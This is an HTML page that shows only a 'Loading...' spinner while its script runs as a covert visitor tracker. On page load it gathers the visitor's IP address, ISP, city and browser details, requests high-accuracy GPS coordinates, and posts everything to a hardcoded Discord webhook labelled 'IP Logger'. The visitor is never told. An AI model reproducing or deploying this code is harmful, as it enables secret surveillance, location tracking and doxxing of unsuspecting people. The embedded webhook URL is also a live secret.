<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ffff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .loading-text {
            font-size: 18px;
            color: #00ffff;
            font-weight: 300;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div class="loading-text">Loading<span class="dots"></span></div>
    </div>

    <script>
        // Simple and reliable version
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN";

        // Get basic IP info first
        async function getBasicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Get detailed IP info with retry
        async function getDetailedIPInfo(ip) {
            // Try multiple endpoints
            const endpoints = [
                `https://ipapi.co/${ip}/json/`,
                `https://ipwhois.app/json/${ip}`,
                'https://jsonip.com/'
            ];

            for (let endpoint of endpoints) {
                try {
                    console.log('Trying endpoint:', endpoint);
                    const response = await fetch(endpoint);
                    if (response.ok) {
                        const data = await response.json();
                        console.log('Success with endpoint:', endpoint, data);
                        return data;
                    }
                } catch (error) {
                    console.log('Failed with endpoint:', endpoint, error);
                    continue;
                }
            }
            return null;
        }

        // Simple user agent parsing
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            else if (/Linux/.test(ua)) os = 'Linux';

            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg/.test(ua)) browser = 'Edge';

            return { os, browser };
        }

        // Send to Discord
        async function sendToDiscord(data) {
            try {
                // Format the message
                const message = {
                    username: "IP Logger",
                    embeds: [{
                        title: "üåê New Visitor",
                        color: 0x00FFFF,
                        description: `
**IP Address:** \`${data.ip || 'Unknown'}\`
**Country:** ${data.country || 'Unknown'} ${data.country_code ? `(${data.country_code})` : ''}
**Region:** ${data.region || data.regionName || 'Unknown'}
**City:** ${data.city || 'Unknown'}
**ISP:** ${data.isp || data.org || 'Unknown'}
**Timezone:** ${data.timezone || 'Unknown'}

**Device Info:**
**OS:** ${data.browserInfo.os}
**Browser:** ${data.browserInfo.browser}
**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``,
                        timestamp: new Date().toISOString()
                    }]
                };

                console.log('Sending to Discord:', message);

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    console.log('Successfully sent to Discord');
                } else {
                    console.error('Discord response not OK:', response.status);
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Get precise location
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            coords: `${position.coords.latitude},${position.coords.longitude}`,
                            accuracy: position.coords.accuracy,
                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    (error) => {
                        console.log('Geolocation failed:', error);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Send precise location to Discord
        async function sendPreciseLocation(data, location) {
            try {
                const message = {
                    username: "IP Logger - GPS Location",
                    embeds: [{
                        title: "üìç Precise Location",
                        color: 0x00FF00,
                        description: `
**IP:** \`${data.ip}\`
**Precise Coordinates:** \`${location.coords}\`
**Accuracy:** ${location.accuracy} meters
**Google Maps:** [View Location](${location.mapsLink})

**Additional Info:**
**Country:** ${data.country || 'Unknown'}
**City:** ${data.city || 'Unknown'}
**ISP:** ${data.isp || data.org || 'Unknown'}`,
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });
            } catch (error) {
                console.error('Error sending precise location:', error);
            }
        }

        // Main function
        async function init() {
            console.log('Starting IP logger...');

            try {
                // Get basic IP first
                const ip = await getBasicIP();
                console.log('Basic IP:', ip);

                // Get detailed information
                const detailedInfo = await getDetailedIPInfo(ip);
                console.log('Detailed info:', detailedInfo);

                // Parse user agent
                const browserInfo = parseUserAgent(navigator.userAgent);

                // Combine all data
                const logData = {
                    ip: ip,
                    ...detailedInfo,
                    browserInfo: browserInfo
                };

                console.log('Final data to send:', logData);

                // Send to Discord
                await sendToDiscord(logData);

                // Try to get precise location (optional)
                const preciseLocation = await getPreciseLocation();
                if (preciseLocation) {
                    await sendPreciseLocation(logData, preciseLocation);
                }

            } catch (error) {
                console.error('Error in init:', error);
                
                // Send error to Discord
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: "IP Logger - ERROR",
                            embeds: [{
                                title: "‚ö†Ô∏è Logger Error",
                                color: 0xFF0000,
                                description: `Error: ${error.message}\n\nUser Agent: ${navigator.userAgent}`,
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error:', e);
                }
            }
        }

        // Start when page loads
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM loaded, starting logger...');
            setTimeout(init, 1000); // Small delay to ensure everything is ready
        });

        // Also try on window load as backup
        window.addEventListener('load', function() {
            console.log('Window loaded');
        });
    </script>
</body>
</html>
